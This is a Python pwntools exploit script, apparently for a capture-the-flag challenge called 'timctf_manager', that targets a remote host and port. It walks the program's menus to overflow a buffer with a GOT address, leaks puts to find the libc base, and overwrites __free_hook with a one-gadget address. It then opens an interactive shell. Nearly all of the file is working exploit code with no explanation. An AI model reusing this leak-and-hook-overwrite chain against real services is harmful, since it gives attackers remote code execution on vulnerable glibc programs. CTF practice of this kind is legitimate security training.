#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

# Pwntools custom functions
context.terminal = ['tmux', 'split', '-h']
def _snd(s):
  io.send(str(s))
def _sndl(s):
  io.sendline(str(s))
def _snda(a,s):
  io.sendafter(str(a),str(s))
def _sndal(a,s):
  io.sendlineafter(str(a),str(s))
def _rcvu(s):
  return io.recvuntil(str(s))
def _rcva():
  return io.recvall()
def _rcvn(n):
  return io.recv(n)

exe = context.binary = ELF('timctf_manager')

host = args.HOST or '89.38.208.144'
port = int(args.PORT or 11114)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
p='Exit'
_sndal(p, '1')
_sndl(1)
_sndal(':', 'aa')
for i in range(5):
    _sndal(':', 123)

_sndal(p, '1')
_sndl(2)
for i in range(6):
    _sndal(':', 123)

_sndal(p, 3)
_sndl(1)
for i in range(5):
    _sndal(':', 123)
_sndal(':', pack(0x602028) * (100 + 0x100 / 8))
_sndal(p, 4)
_sndl(2)
_rcvu('comment: ')
libc = ELF('./libc-2.27.so')
libc.address = unpack(_rcvn(8)) - libc.symbols['puts']
log.info(hex(libc.address))

_sndal(p, 3)
_sndl(1)
for i in range(5):
    _sndal(':', 123)
_sndal(':', pack(libc.symbols['__free_hook']) * (100 + 0x100 / 8))

_sndal(p, 3)
_sndl(2)
for i in range(5):
    _sndal(':', 123)
_sndal(':', pack(libc.address + 0x4f322))

_sndal(p, 2)
_sndl(1)

io.interactive()

